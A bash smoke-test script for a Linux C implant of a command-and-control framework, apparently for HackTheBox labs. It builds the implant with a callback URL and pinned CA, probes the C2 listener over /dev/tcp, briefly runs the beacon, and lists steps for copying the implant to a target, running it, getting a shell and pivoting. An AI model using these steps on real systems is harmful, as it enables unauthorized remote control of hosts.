#!/usr/bin/env bash
# FireFlow-style host smoke for Linux C implant (no live HTB required).
# Builds implant with DER CA pin, runs unit tests, optional local register smoke
# if teamserver already listening on CALLBACK host:port.
#
# Usage:
#   ./scripts/c_linux_e2e_smoke.sh
#   CA_CERT_PATH=~/.erebus/ca-cert.pem CALLBACK_URL=https://127.0.0.1:8443 ./scripts/c_linux_e2e_smoke.sh
#   SKIP_LIVE=1 ./scripts/c_linux_e2e_smoke.sh   # build + unit tests only
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
export TMPDIR="${ROOT}/.cache/go-tmp"
export GOTMPDIR="${TMPDIR}"
export GOCACHE="${ROOT}/.cache/gocache"
mkdir -p "$TMPDIR" "$GOCACHE" build

CA_CERT_PATH="${CA_CERT_PATH:-$HOME/.erebus/ca-cert.pem}"
if [[ ! -f "$CA_CERT_PATH" ]]; then
  CA_CERT_PATH="${HOME}/.erebus/certs/ca.pem"
fi
CALLBACK_URL="${CALLBACK_URL:-https://127.0.0.1:8443}"
SKIP_LIVE="${SKIP_LIVE:-0}"
SLEEP_MS="${SLEEP_MS:-500}"

echo "==> C host unit tests"
make -C cimplant test-host

if [[ ! -f "$CA_CERT_PATH" ]]; then
  echo "==> No CA at CA_CERT_PATH; generating ephemeral test CA for build only"
  CA_CERT_PATH="$(mktemp "${ROOT}/build/e2e-ca-XXXXXX.pem")"
  openssl req -x509 -newkey rsa:2048 -keyout "${ROOT}/build/e2e-ca.key" \
    -out "$CA_CERT_PATH" -days 1 -nodes -subj /CN=erebus-e2e-smoke >/dev/null 2>&1
  SKIP_LIVE=1
fi

echo "==> Build implant-c-linux (CA_CERT_PATH=$CA_CERT_PATH CALLBACK=$CALLBACK_URL SLEEP_MS=$SLEEP_MS)"
make implant-c-linux \
  CALLBACK_URL="$CALLBACK_URL" \
  CA_CERT_PATH="$CA_CERT_PATH" \
  SLEEP_MS="$SLEEP_MS" \
  JITTER_PCT=10

BIN="${ROOT}/build/implant_c_linux"
if [[ ! -x "$BIN" ]]; then
  echo "error: missing $BIN" >&2
  exit 1
fi
file "$BIN"
SIZE=$(wc -c <"$BIN" | tr -d ' ')
echo "    size=${SIZE} bytes"
if [[ "$SIZE" -gt 500000 ]]; then
  echo "warn: binary larger than expected for C peer (~80KB class)" >&2
fi

echo "==> Fail-closed: empty HTTPS CA"
set +e
make -C cimplant OS=linux TRANSPORT_TYPE=https CA_CERT_PEM= CA_CERT_PATH= all >/dev/null 2>&1
ec=$?
set -e
if [[ "$ec" -eq 0 ]]; then
  echo "error: expected empty CA build to fail" >&2
  exit 1
fi
echo "    empty CA rejected (exit $ec)"

if [[ "$SKIP_LIVE" == "1" ]]; then
  echo "==> SKIP_LIVE=1 — not starting implant against teamserver"
  echo "==> c_linux_e2e_smoke: PASS (build + unit tests)"
  cat <<EOF

Next (live HTB / FireFlow pattern):
  1. erebus serve / teamserver HTTPS on :8443
  2. ./scripts/htb_reverse_tunnel.sh user@TARGET   # if no VPN route from box
  3. scp build/implant_c_linux user@TARGET:/tmp/
  4. ssh user@TARGET '/tmp/implant_c_linux'
  5. erebus op: sessions / shell whoami
  Pivot: SOCKS not on Linux C — tunnel + Ligolo or Go implant reverse SOCKS
EOF
  exit 0
fi

# Optional: quick register attempt if something answers HTTPS (best-effort).
HOSTPORT="${CALLBACK_URL#https://}"
HOSTPORT="${HOSTPORT#http://}"
HOSTPORT="${HOSTPORT%%/*}"
HOST="${HOSTPORT%%:*}"
PORT="${HOSTPORT##*:}"
[[ "$HOST" == "$PORT" ]] && PORT=443

echo "==> Probe C2 ${HOST}:${PORT}"
if ! timeout 2 bash -c "echo >/dev/tcp/${HOST}/${PORT}" 2>/dev/null; then
  echo "    no listener — skip live implant run (start teamserver or set SKIP_LIVE=1)"
  echo "==> c_linux_e2e_smoke: PASS (build + unit tests; no live C2)"
  exit 0
fi

echo "==> Short live run (8s) — register/beacon attempt"
# Implant loops forever; run briefly and expect process to stay up if registered.
timeout 8 "$BIN" >/tmp/erebus_c_linux_e2e.out 2>/tmp/erebus_c_linux_e2e.err || true
if grep -qiE 'register failed|requires CA|transport create failed|invalid IMPLANT' /tmp/erebus_c_linux_e2e.err 2>/dev/null; then
  echo "warn: implant stderr indicates hard fail:" >&2
  cat /tmp/erebus_c_linux_e2e.err >&2 || true
  # Still pass build path; live C2 misconfig is operator env
fi
echo "==> c_linux_e2e_smoke: PASS"
echo "    see scripts/htb_reverse_tunnel.sh for firewalled HTB drop"
